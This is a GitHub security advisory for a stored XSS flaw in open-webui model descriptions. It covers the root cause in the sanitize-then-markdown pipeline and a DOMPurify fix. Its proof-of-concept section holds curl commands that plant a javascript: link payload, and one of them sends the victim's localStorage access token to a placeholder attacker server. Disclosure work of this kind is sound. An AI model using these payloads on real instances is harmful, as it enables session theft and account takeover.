# [H] open-webui Vulnerable to Stored XSS via Model Description

## Summary
Severity: High
Advisory: GHSA-gf5m-wcrh-7928
CVE: CVE-2026-44721
CWE: CWE-79
Ecosystem: PyPI, npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-gf5m-wcrh-7928
Type: github-advisory

## Affected
- npm: `open-webui` — affected >=0 <0.9.0
- PyPI: `open-webui` — affected >=0 <0.9.0

## Details
> [!IMPORTANT]
>  Relationship to CVE-2024-7990

> CVE-2024-7990 (issued by huntr.dev, March 2025) describes a stored XSS in the same field — the model description — but exploits a different bypass mechanism: a second-order injection through the sanitizeResponseContent function's video-tag placeholder restoration logic in v0.3.x. That bypass was closed in v0.4.0 by removing the video exemption from the sanitizer.

The vulnerability described in this advisory is structurally distinct: a markdown-link payload with a javascript: URI passes through sanitizeResponseContent unchanged (no angle brackets), is then parsed by marked.parse() into an `<a href="javascript:...">` element, and rendered live by `{@html}`. This is a pipeline-ordering flaw where the dangerous construct is introduced after sanitization completes. Removing the video exemption has no effect on this primitive.

Affected range: v0.3.5 through v0.8.12 inclusive. Fixed in: v0.9.0 (commit 5eab125, which wraps marked.parse() output in DOMPurify.sanitize).

Both vulnerabilities are independently fixable under CVE rule 4.2.11. CVE assignment for this advisory has been requested separately on that basis.

### Summary

This is a stored cross-site scripting (XSS) vulnerability that allows any authenticated user with model creation permission (workspace.models) to execute arbitrary JavaScript in the browser of any other user (including admins) who views the malicious model in the chat UI.

### Details

Root Cause:
Model descriptions are rendered in two Svelte components via this chain:
`sanitizeResponseContent(description)  →  .replaceAll('\n', '<br>')  →  marked.parse()  →  {@html ...}`

The model description is stored in the database without prior sanitization. Then uses this sanitization function before applying the results to the description.

`index.ts:82-92`
```ts
export const sanitizeResponseContent = (content: string) => {
    return content
        .replace(/<\|[a-z]*$/, '')       // strip incomplete <|tokens
        .replace(/<\|[a-z]+\|$/, '')     // strip incomplete <|token| 
        .replace(/<$/, '')               // strip trailing <
        .replaceAll('<', '&lt;')         // escape < to &lt;
        .replaceAll('>', '&gt;')         // escape > to &gt;
        .replaceAll(/<\|[a-z]+\|>/g, ' ') // strip <|token|> patterns
        .trim();
};
```
This function was designed to sanitize HTML tags, but does not take into consideration that XSS can be triggered via `javascript:` which is the fundamental issue.

`.replaceAll('\n', '<br>')` will replace newlines with `<br>` tags, and since payload can be written without newlines, its unaffected.

`marked` sees `[text](url)` and generated an anchor tag and does not block the payload of `javascript:`.

Svelte's `{@html}` directive inserts raw HTML into the DOM without escaping, creating the vulnerability.

Affected files:
`src/lib/components/chat/Placeholder.svelte` (lines 177–181)
`src/lib/components/chat/ChatPlaceholder.svelte` (lines 99–103)


### PoC

Below is a simple PoC that will create a model with a description to trigger an alert when pressing on the hyperlink. Replace the values inside such as HOST and TOKEN with your own values using your own test server.

Step 1 - Create a model with a malicious description. The token used must be from an account with either the following.
A. Admin privileges
B. An account with model creation permission

```bash
curl -X POST 'http://<HOST>/api/v1/models/create' \
  -H 'Authorization: Bearer <TOKEN>' \
  -H 'Content-Type: application/json' \
  -d '{
    "id": "xss-test",
    "name": "Helpful Assistant!",
    "base_model_id": "llama3",
    "meta": {
      "description": "A helpful AI assistant. [Click here for docs](javascript:alert())"
    },
    "params": {}
  }'
```
Any authenticated user with workspace.models permission can execute this. The base_model_id should reference any model available on the instance.

Step 2 - Select the model:

Login and select the created model, if you followed the PoC it will be Helpful Asisstant!
<img width="1203" height="718" alt="image" src="https://github.com/user-attachments/assets/d649c727-276c-4011-8234-140c51a32b68" />

Step 3 - XSS Triggers:

Click on the hyperlink and watch the alert trigger.
<img width="1203" height="718" alt="image" src="https://github.com/user-attachments/assets/289fc3d4-e09a-45a4-b83d-40984d47a760" />

**Below is a PoC that steals the access token from localstorage**

Step 1 - Setup a local python HTTPServer

`python3 -m http.sever 8080`

Step 2 - Create a model with a malicious payload to steal the token from localstorage

```bash
curl -X POST 'http://<HOST>/api/v1/models/create' \
  -H 'Authorization: Bearer <TOKEN>' \
  -H 'Content-Type: application/json' \
  -d '{
    "id": "xss-model",
    "name": "Token Stealer",
    "base_model_id": "llama3",
    "meta": {
      "description": "Advanced research model. [View benchmarks](javascript:void(fetch(`http://<MALICIOUS_SERVER_IP>:8080/?t=${localStorage.token}`)))"
    },
    "params": {}
  }'
```
Step 3 - Navigate to the malicious model and click on the hyperlink

Check on the local server you have set up in Step 1 and see that the token is returned within the URL.
<img width="669" height="50" alt="image" src="https://github.com/user-attachments/assets/7933e855-cc0a-40f5-a443-5c0363b1b8fa" /> 


### Impact

As user's session is stored in LocalStorage, attacker can craft a malicious payload that reads the contents and sends it to their malicious server. Once an admin access token has been stolen, users can create a new tool to execute arbitrary code (feature of Open-WebUI).

Attack Scenario 
```
1. Attacker creates a model with a malicious description
2. Victim selects model and clicks the hyperlink
3. Victim authorization token is stolen
```
This vulnerability affects all Open-WebUI users.

### Remediation

Recommended fix — wrap `marked.parse()` output with `DOMPurify.sanitize()`.

In the affected files, change

```ts
{@html marked.parse(
    sanitizeResponseContent(description).replaceAll('\n', '<br>')
)}
```

into

```ts
{@html DOMPurify.sanitize(
    marked.parse(
        sanitizeResponseContent(description).replaceAll('\n', '<br>')
    )
)}
```
This matches the pattern already used in other parts of the application such as but not limiting to `ConfirmDialog.svelte:130` and `NotebookView.svelte:77`. DOMPurify will handle the stripping of `javascript:` URIs, event handlers and other dangerous HTML by default.

### AI Disclosure

Claude was used to assist in:

Systematic codebase searching to identify unsanitized `{@html}` rendering paths
Verifying `marked@9.1.6` behavior with `javascript:` URIs

## Credits

Lin, WeiChi from Sompo Holdings, Inc.

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-gf5m-wcrh-7928
- https://nvd.nist.gov/vuln/detail/CVE-2026-44721
- https://github.com/open-webui/open-webui
